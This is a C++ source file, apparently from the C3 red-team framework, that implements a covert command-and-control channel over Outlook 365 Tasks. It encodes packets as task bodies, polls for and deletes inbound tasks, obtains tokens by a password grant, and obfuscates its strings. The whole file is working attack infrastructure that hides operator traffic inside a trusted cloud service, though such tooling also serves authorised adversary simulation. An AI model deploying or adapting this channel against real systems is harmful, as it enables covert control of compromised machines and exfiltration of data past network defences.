#include "StdAfx.h"
#include "Outlook365RestTask.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"

// Namespaces.
using json = nlohmann::json;
using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

std::atomic<std::chrono::steady_clock::time_point> FSecure::C3::Interfaces::Channels::Outlook365RestTask::s_TimePoint = std::chrono::steady_clock::now();

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Outlook365RestTask::Outlook365RestTask(ByteView arguments)
	: m_InboundDirectionName{ arguments.Read<std::string>() }
	, m_OutboundDirectionName{ arguments.Read<std::string>() }
	, m_username{ arguments.Read<std::string>() }
	, m_Password{ arguments.Read<std::string>() }
	, m_clientKey{ arguments.Read<std::string>() }
{
	// Obtain proxy information and store it in the HTTP configuration.
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	RefreshAccessToken();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnSendToChannel(ByteView data)
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	try
	{
		// Construct the HTTP request
		HttpClient webClient(OBF(L"https://outlook.office.com/api/v2.0/me/tasks"), m_ProxyConfig);

		HttpRequest request; // default request is GET
		std::string auth = "Bearer " + m_token;
		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
		request.m_Method = Method::POST;

		// For the JSON body, take a simple approach and use only the required fields.
		json jsonBody;
		jsonBody[OBF("Subject")] = m_OutboundDirectionName;
		jsonBody[OBF("Body")][OBF("Content")] = cppcodec::base64_rfc4648::encode(&data.front(), data.size());
		jsonBody[OBF("Body")][OBF("ContentType")] = OBF("Text");
		std::string body = jsonBody.dump();
		request.SetData(ContentType::ApplicationJson, { body.begin(), body.end() });
		request.m_ContentType = L"application/json";

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() != StatusCode::OK && resp.GetStatusCode() != StatusCode::Created)
		{
			if (resp.GetStatusCode() == StatusCode::TooManyRequests) // break and set sleep time.
			{
				s_TimePoint = std::chrono::steady_clock::now() + FSecure::Utils::GenerateRandomValue(10s, 20s);
				throw std::runtime_error{ OBF("Too many requests") };
			}
			if (resp.GetStatusCode() == StatusCode::Unauthorized)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") };

			}
			if (resp.GetStatusCode() == StatusCode::BadRequest)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("Bad Request") };
			}

			throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(resp.GetStatusCode()) };
		}

		return data.size();
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Warning });
		return 0u;
	}

	return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnReceiveFromChannel()
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	std::vector<ByteVector> packets;
	try
	{
		// Construct request to get tasks.
		// Filtered by subjects that start with m_InboundDirectionName, order by oldest first, and fetch 1000 tasks.
		// Example: https://outlook.office.com/api/v2.0/me/tasks?top=1000&filter=startswith(Subject,'C2S')&orderby=CreatedDateTime
		std::string URLwithInboundDirection = OBF("https://outlook.office.com/api/v2.0/me/tasks?top=");
		URLwithInboundDirection += OBF("1000"); // number of tasks to fetch
		URLwithInboundDirection += OBF("&filter=startswith(Subject,'"); // filter by subject
		URLwithInboundDirection += m_InboundDirectionName; // subject should contain m_InboundDirectionName
		URLwithInboundDirection += OBF("')&orderby=CreatedDateTime"); // order by creation date (oldest first)

		HttpClient webClient(Convert<Utf16>(URLwithInboundDirection), m_ProxyConfig);

		HttpRequest request; // default request is GET
		std::string auth = "Bearer " + m_token;
		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() != StatusCode::OK)
		{
			if (resp.GetStatusCode() == StatusCode::TooManyRequests)
			{
				s_TimePoint = std::chrono::steady_clock::now() + FSecure::Utils::GenerateRandomValue(10s, 20s);
				throw std::runtime_error{ OBF("Too many requests") };
			}

			if (resp.GetStatusCode() == StatusCode::Unauthorized)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") };

			}

			if (resp.GetStatusCode() == StatusCode::BadRequest)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("Bad Request") };
			}

			throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(resp.GetStatusCode()) };
		}

		auto responseData = resp.GetData();
		// Gracefully handle situation where there's an empty JSON value (e.g., a failed request)
		if (responseData.size() == 0)
			return {};

		// Convert response (as string_t to utf8) and parse.
		json taskDataAsJSON;
		try
		{
			taskDataAsJSON = json::parse(responseData);
		}
		catch (json::parse_error& err)
		{
			Log({ OBF("Failed to parse the list of received tasks."), LogMessage::Severity::Error });
			return {};
		}

		for (auto& element : taskDataAsJSON.at(OBF("value")))
		{
			// Obtain subject and task ID.
			std::string subject = element.at(OBF("Subject")).get<std::string>();
			std::string id = element.at(OBF("Id")).get<std::string>();

			// Verify that the full subject and ID were obtained.  If not, ignore.
			if (subject.empty() || id.empty())
				continue;

			// Check the direction component is at the start of subject.
			if (subject.find(m_InboundDirectionName))
				continue;

			try
			{
				// Send the (decoded) message's body.
				ByteVector packet = cppcodec::base64_rfc4648::decode(element.at(OBF("Body")).at(OBF("Content")).get<std::string>());
				packets.emplace_back(packet);
				SCOPE_GUARD(RemoveTask(id); );
			}
			catch (const cppcodec::parse_error& exception)
			{
				Log({ OBF("Error decoding task #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
			}
			catch (std::exception& exception)
			{
				Log({ OBF("Caught a std::exception when processing task #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
			}
		}
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packets;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Outlook365RestTask::RemoveAllTasks(ByteView)
{

	try
	{
		// Construct request. One minor limitation of this is that it will remove 1000 tasks only (the maximum of "top"). This could be paged.
		HttpClient webClient(OBF(L"https://outlook.office.com/api/v2.0/me/tasks?$top=1000"), m_ProxyConfig);

		HttpRequest request; // default request is GET
		std::string auth = "Bearer " + m_token;
		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
		auto resp = webClient.Request(request);


		if (resp.GetStatusCode() != StatusCode::OK)
		{
			Log({ OBF("RemoveAllFiles() Error.  Files could not be deleted. Confirm access and refresh tokens are correct."), LogMessage::Severity::Error });
			return {};
		}

		// Parse response (list of tasks)
		auto taskDataAsJSON = nlohmann::json::parse(resp.GetData());

		// For each task (under the "value" key), extract the ID, and send a request to delete the task.
		for (auto& element : taskDataAsJSON.at(OBF("value")))
			RemoveTask(element.at(OBF("id")).get<std::string>());
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running RemoveAllTasks(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Outlook365RestTask::RemoveTask(std::string const& id)
{

	// There is a minor logic flaw in this part of the code, as it assumes the access token is still valid, which may not be the case.
	auto URLwithID = OBF("https://outlook.office.com/api/v2.0/me/tasks('") + id + OBF("')");
	HttpClient webClient(Convert<Utf16>(URLwithID), m_ProxyConfig);

	HttpRequest request; // default request is GET
	std::string auth = "Bearer " + m_token;
	request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
	request.m_Method = Method::DEL;
	auto resp = webClient.Request(request);

	if (resp.GetStatusCode() > 205)
		Log({ OBF("RemoveTask() Error. Task could not be deleted. HTTP response:") + std::to_string(resp.GetStatusCode()), LogMessage::Severity::Error });

	return;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Outlook365RestTask::RefreshAccessToken()
{
	try
	{
		//Token endpoint
		HttpClient webClient(Convert<Utf16>("https://login.windows.net/organizations/oauth2/v2.0/token"), m_ProxyConfig);

		HttpRequest request; // default request is GET
		request.m_Method = Method::POST;
		request.SetHeader(Header::ContentType, L"application/x-www-form-urlencoded; charset=utf-16");//ContentType::ApplicationXWwwFormUrlencoded);
		json data;

		auto requestBody = ""s;
		requestBody += OBF("grant_type=password");
		requestBody += OBF("&scope=https://outlook.office365.com/.default");
		requestBody += OBF("&username=");
		requestBody += m_username;
		requestBody += OBF("&password=");
		requestBody += m_Password;
		requestBody += OBF("&client_id=");
		requestBody += m_clientKey;

		request.SetData(ContentType::ApplicationXWwwFormUrlencoded, { requestBody.begin(), requestBody.end() });
		FSecure::Utils::SecureMemzero(requestBody.data(), requestBody.size());
		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK)
			data = json::parse(resp.GetData());
		else
			throw std::runtime_error{ OBF("Refresh access token request - non-200 status code was received: ") + std::to_string(resp.GetStatusCode()) };

		m_token = data["access_token"].get<std::string>();
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error{ OBF_STR("Cannot refresh token: ") + exception.what() };
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		return RemoveAllTasks(command);
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteView FSecure::C3::Interfaces::Channels::Outlook365RestTask::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Username",
				"min": 0,
				"description": "User with Office 365 subscription."
			},
			{
				"type": "string",
				"name": "Password",
				"min": 0,
				"description": "User password."
			},
			{
				"type": "string",
				"name": "Client key",
				"min": 1,
				"description": "Identifies the application (e.g. a GUID). User, or user admin must give consent for application to work in user context."
			}
		]
	},
	"commands":
	[
		{
			"name": "Remove all tasks",
			"id": 0,
			"description": "Clearing old tasks from server may increase bandwidth",
			"arguments": []
		}
	]
}
)_";
}

